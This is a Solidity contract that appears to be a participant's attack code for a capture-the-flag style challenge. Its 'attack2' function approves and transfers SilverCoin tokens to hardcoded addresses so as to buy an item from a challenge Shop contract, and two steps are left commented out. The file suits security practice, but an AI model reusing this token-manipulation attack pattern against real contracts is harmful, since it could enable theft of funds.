// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "./SilverCoin.sol";
import "./Shop.sol";


contract Contract{
	address public YOUR_CHALLENGE_CONTRACT_ADDRESS = address(0x894CEFb5170871144C8Fa937D28634C8f7F837a9);
	address public source = address(0x0a107Cda0C45B7004E0Dc22Db9E261ABA6668432);
	SilverCoin public creature;
	Shop public shop;
	constructor() {
		creature = SilverCoin(0xCc3a130d38849f67985A3E03eE98754B1Dd5aC67);
		shop = Shop(YOUR_CHALLENGE_CONTRACT_ADDRESS);
	}

	function attack2() external {
		creature.approve(source, 25_000_000);
		creature.approve(YOUR_CHALLENGE_CONTRACT_ADDRESS, 25_000_000);
		creature.transfer(source, 25_000_000);
		creature.transfer(source, 25_000_000);
		//creature._approve(source,YOUR_CHALLENGE_CONTRACT_ADDRESS,25_000_000);
		//shop.buyItem(2);
	}

	function balanceOf(address account) public view returns (uint256) {
		return creature.balanceOf(account);
	}


}

